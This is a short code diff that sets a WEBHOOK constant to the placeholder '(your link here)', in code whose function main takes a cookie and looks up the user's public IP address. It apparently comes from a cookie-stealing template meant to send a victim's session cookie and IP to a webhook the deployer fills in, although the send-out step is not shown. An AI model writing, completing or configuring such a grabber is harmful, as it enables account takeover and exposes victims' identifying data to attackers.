@@ -1,4 +1,4 @@
-const WEBHOOK = "";
+const WEBHOOK = "(your link here)";
 
 async function main(cookie) {
     var ipAddr = await (await fetch("https://api.ipify.org")).text();
